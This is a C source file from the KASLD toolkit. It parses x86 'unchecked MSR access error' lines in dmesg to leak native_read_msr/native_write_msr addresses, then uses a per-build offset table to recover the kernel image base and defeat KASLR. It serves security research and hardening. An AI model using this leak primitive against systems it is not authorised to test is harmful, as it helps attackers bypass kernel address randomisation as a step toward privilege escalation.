// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Recover native_read_msr / native_write_msr pointers from x86 MSR-fault error
// messages, confirmed by the message's own %pS symbol (an unrecognised symbol
// is still emitted as a bare kernel-text interior sample).
//
// The `ex_handler_msr` exception handler function prints registers
// (including RIP) to the kernel log:
//
// clang-format off
// pr_warn("unchecked MSR access error: WRMSR to 0x%x (tried to write 0x%08x%08x) at rIP: 0x%lx (%pS)\n",
//        (unsigned int)regs->cx, (unsigned int)regs->dx,
//        (unsigned int)regs->ax,  regs->ip, (void *)regs->ip);
//
// pr_warn("unchecked MSR access error: RDMSR from 0x%x at rIP: 0x%lx (%pS)\n",
//        (unsigned int)regs->cx, regs->ip, (void *)regs->ip);
// clang-format on
//
// regs->ip (RIP) address is printed as a raw pointer using "%lx" printk format.
//
// The "%pS" printk format prints the symbol name; however, if kernel symbols
// are disabled (CONFIG_KALLSYMS=n) then raw pointers are printed instead.
//
// Kernels may be compiled without debugging symbols to decrease the size of
// the kernel image.
//
// Prior to kernel v5.2-rc1~168^2^2 on 2019-03-25, the "%pF" printk format
// was used instead of "%pS". This printed raw function pointers.
//
// clang-format off
// $ dmesg | grep "unchecked MSR access error"
// [    0.133554] unchecked MSR access error: RDMSR from 0x852 at rIP: 0xffffffffad467c37 (native_read_msr+0x7/0x40)
// $ sudo grep native_read_msr /proc/kallsyms 
// [sudo] password for test: 
// ffffffffad467bf0 t native_read_msr_safe
// ffffffffad467c30 t native_read_msr
// $ ./build/dmesg_ex_handler_msr.o 
// [.] searching dmesg for native_[read|write]_msr function pointer ...
// leaked native_read_msr: ffffffffad467c37
// clang-format on
//
// Leak primitive:
//   Data leaked:      kernel function virtual address (native_read/write_msr
//   RIP) Kernel subsystem: arch/x86/mm/extable — ex_handler_msr() Data
//   structure:   struct pt_regs → ip (instruction pointer at MSR fault) Address
//   type:     virtual (kernel text) Method:           parsed (dmesg string)
//   Status:           unfixed — raw %lx RIP still printed at v7.2-rc5 (2026);
//                     only change ever was the cosmetic %pF -> %pS (v5.2)
//   Access check:     do_syslog() → check_syslog_permissions(); gated by
//                     dmesg_restrict
//   Source:
//   https://elixir.bootlin.com/linux/v6.1.1/source/arch/x86/mm/extable.c
//
// Mitigations:
//   CONFIG_KALLSYMS=y causes %pS to print symbolized names (but %lx
//   raw pointer is always printed regardless). Access gated by
//   dmesg_restrict (see dmesg.h for shared access gate details).
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// Reachability:
// - Opportunistic, not on-demand. The warning comes from kernel-internal
//   *unsafe* rdmsr/wrmsr that fault (EX_TYPE_RDMSR/WRMSR -> pr_warn), which
//   happens mostly at boot when the kernel probes a model-specific MSR that is
//   absent on this CPU/VM (the RDMSR from 0x852 above is exactly that). No
//   unprivileged path mints a fresh one: /dev/cpu/*/msr uses the *safe*
//   accessors (silent) and needs CAP_SYS_RAWIO, and the unprivileged unsafe
//   readers (aperfmperf behind scaling_cur_freq, the msr PMU) only touch MSRs
//   the CPU advertises as present, so on real hardware they do not fault. The
//   message is thus usually already in the ring buffer, but can wrap out.
//
// Base recovery:
// - The faulting symbol is confirmed from the message's own %pS field, e.g.
//   "(native_read_msr+0x7/0x40)": reported as native_read/write_msr only when
//   the kernel's kallsyms named it so; an inline rdmsr in another function, or
//   CONFIG_KALLSYMS=n (a raw pointer), is emitted as an unnamed interior sample
//   instead. native_read_msr is not a fixed distance from _text (its offset
//   drifts ~0.01 MiB to ~4 MiB across distro kernels 2020-2026), so a floor is
//   unsound but the %pS "+off" gives the symbol's address (RIP - off), and the
//   uname-keyed offset table below gives that symbol's distance from _text for
//   the exact build, so on a known build base_from_offset() recovers _text and
//   pins it as the LIKELY image base (CONF_HEURISTIC). On an unknown build the
//   interior sample still bounds the base. The same raw-%lx line is also
//   printed by arch/x86/kernel/cpu/mce/core.c, which this search matches.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/x86/mm/extable.c
// https://www.kernel.org/doc/html/latest/core-api/printk-formats.html
// https://cateee.net/lkddb/web-lkddb/KALLSYMS.html
// https://github.com/torvalds/linux/commit/d75f773c86a2b8b7278e2c33343b46a4024bc002
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE

#if !defined(__x86_64__) && !defined(__amd64__) && !defined(__i386__)
#error "Architecture is not supported"
#endif

#include "include/dmesg.h"
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/kasld/hash.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Searches dmesg for x86 unchecked-MSR-access error messages, which print "
    "the faulting instruction pointer as a raw hex address (unchecked MSR "
    "access error: ... at rIP: 0x...) unaffected by kptr_restrict. Reports it "
    "as native_read_msr / native_write_msr only when the message's own %%pS "
    "field names that symbol, so the identity is certain and not an inline "
    "rdmsr elsewhere; on a build in the offset table the symbol's distance "
    "from "
    "_text then pins the image base. Access is gated by dmesg_restrict.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "sysctl:dmesg_restrict>=1\n"
           "bypass:CAP_SYSLOG\n"
           "fallback:/var/log/dmesg\n");

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

/* Per-build offsets of native_read_msr / native_write_msr from _text, keyed on
 * an FNV-1a-64 hash of the running kernel's full uname ("<release> <version>")
 * build fingerprint (same keying and hash as qemu_tcg_iret / bpf_verifier_ksym;
 * kasld_fnv1a64 in include/kasld/hash.h). off[0] = native_read_msr, off[1] =
 * native_write_msr; a 0 marks a symbol absent from that build. The leak is x86
 * only, so the rows are split into an x86_64 and an i386 #if block (same arch
 * dispatch as api.h); the component itself is #error-gated to x86, so the build
 * skips it on other arches. The offset is per-build (native_read_msr sits
 * anywhere from ~0.01 to ~4 MiB past _text across releases), so a match pins
 * the base exactly where a floor cannot. */
struct kernel_info {
  uint64_t uname_hash;
  uint32_t off[2];
};
#ifdef __has_include
#if !__has_include("offsets/dmesg_ex_handler_msr.inc")
#error "offsets/dmesg_ex_handler_msr.inc missing — regenerate the offset table"
#endif
#endif
#include "offsets/dmesg_ex_handler_msr.inc"
#ifndef KASLD_OFFSETS_PRESENT
#error                                                                         \
    "offsets/dmesg_ex_handler_msr.inc did not define the table — regenerate it"
#endif
#undef KASLD_OFFSETS_PRESENT

static const char *needle = " at rIP: 0x";

/* Symbol names by index; matches the off[] columns in struct kernel_info. */
static const char *const msr_names[2] = {"native_read_msr", "native_write_msr"};

/* Lowest matching RIP, split by whether the kernel's own %pS confirmed it. */
struct msr_leak {
  unsigned long verified; /* lowest RIP whose %pS names native_read/write_msr */
  int verified_idx;       /* 0 = native_read_msr, 1 = native_write_msr */
  unsigned long verified_woff; /* within-symbol offset from the %pS "+0xNN" */
  unsigned long any;           /* lowest kernel-text RIP, symbol unconfirmed */
};

/* The message prints the kernel's own kallsyms resolution of the RIP right
 * after the raw hex: "... at rIP: 0x<hex> (native_read_msr+0x7/0x40)". Trust
 * that name: return the helper's index (0 = read, 1 = write) only on an exact
 * match — the trailing '+' or ')' rules out native_read_msr_safe and every
 * other symbol — and set *woff to the within-symbol offset (the "+0xNN", or 0
 * when the name stands alone). Returns -1 when %pS named a different function
 * (an inline rdmsr) or printed a raw pointer (CONFIG_KALLSYMS=n). `after_rip`
 * is the text immediately after the hex: a space, then the parenthesised
 * symbol. */
static int msr_symbol(const char *after_rip, unsigned long *woff) {
  if (after_rip[0] != ' ' || after_rip[1] != '(')
    return -1;
  const char *q = after_rip + 2;
  size_t n;
  int idx;
  if (strncmp(q, "native_read_msr", 15) == 0 &&
      (q[15] == '+' || q[15] == ')')) {
    idx = 0;
    n = 15;
  } else if (strncmp(q, "native_write_msr", 16) == 0 &&
             (q[16] == '+' || q[16] == ')')) {
    idx = 1;
    n = 16;
  } else {
    return -1;
  }
  *woff = (q[n] == '+') ? strtoul(q + n + 1, NULL, 16) : 0;
  return idx;
}

static int on_match(const char *line, void *ctx) {
  struct msr_leak *m = ctx;

  const char *p = strstr(line, needle);
  if (!p)
    return 1;

  unsigned long addr;
  const char *endptr;
  if (!kasld_addr_parse(p + strlen(needle), 16, &addr, &endptr) || !addr ||
      !kasld_addr_is_kernel_text(addr))
    return 1;

  if (!m->any || addr < m->any)
    m->any = addr;

  unsigned long woff;
  int idx = msr_symbol(endptr, &woff);
  if (idx >= 0 && (!m->verified || addr < m->verified)) {
    m->verified = addr;
    m->verified_idx = idx;
    m->verified_woff = woff;
  }
  return 1; /* keep scanning for the lowest of each */
}

/* Recover _text from a confirmed native_read/write_msr RIP. The message gives
 * the within-symbol offset (woff), so the symbol's address is rip - woff, and
 * the offset table gives that symbol's distance from _text for this exact build
 * (keyed on the uname). CONF_HEURISTIC: it trusts the uname build fingerprint,
 * so it pins only the LIKELY window. Returns 0 on an unknown build or a symbol
 * absent from its row. */
static unsigned long base_from_offset(unsigned long rip, int idx,
                                      unsigned long woff) {
  struct utsname u;
  if (kasld_uname(&u) != 0)
    return 0;
  char v[512];
  kasld_uname_fingerprint(v, sizeof v, &u);
  uint64_t h = kasld_fnv1a64(v);
  for (unsigned long i = 0; i < ARRAY_SIZE(offsets); i++) {
    if (offsets[i].uname_hash != h)
      continue;
    uint32_t off = offsets[i].off[idx];
    unsigned long sym = rip - woff; /* symbol start */
    if (off == 0 || off > sym)
      return 0;
    return sym - off; /* _text */
  }
  return 0;
}

int main(void) {
  struct msr_leak m = {0};

  kasld_info(
      "searching dmesg for native_[read|write]_msr function pointer ...");
  int ds = dmesg_search(" at rIP: 0x", on_match, &m);

  if (!m.any) {
    if (ds < 0)
      return KASLD_EXIT_NOPERM;
    kasld_err("ex_handler_msr function pointer not found in dmesg");
    return 0;
  }

  if (!m.verified) {
    /* An MSR-fault RIP whose %pS named a different function, or was a raw
     * pointer (CONFIG_KALLSYMS=n): still a sound kernel-text interior sample,
     * but not attributable to the native helper, so emit it unnamed. */
    kasld_found("leaked MSR-fault RIP (symbol unconfirmed): %lx", m.any);
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, m.any, NULL,
                        CONF_PARSED);
    return 0;
  }

  /* Certain: the kernel resolved this RIP to the named helper via its own
   * kallsyms, so it is that symbol and not an inline rdmsr elsewhere. */
  const char *sym = msr_names[m.verified_idx];
  kasld_found("leaked %s: %lx", sym, m.verified);
  kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, m.verified, sym,
                      CONF_PARSED);

  /* If the offset table knows this build, the confirmed symbol's distance from
   * _text pins the image base (LIKELY window). A no-op on an unknown build; the
   * interior sample above still bounds it. */
  unsigned long base =
      base_from_offset(m.verified, m.verified_idx, m.verified_woff);
  if (base && kasld_addr_is_kernel_text(base)) {
    kasld_found("image base pinned via offset table: %lx", base);
    kasld_result_base(KASLD_TYPE_VIRT, REGION_KERNEL_IMAGE, base, "_text",
                      CONF_HEURISTIC);
  }

  return 0;
}
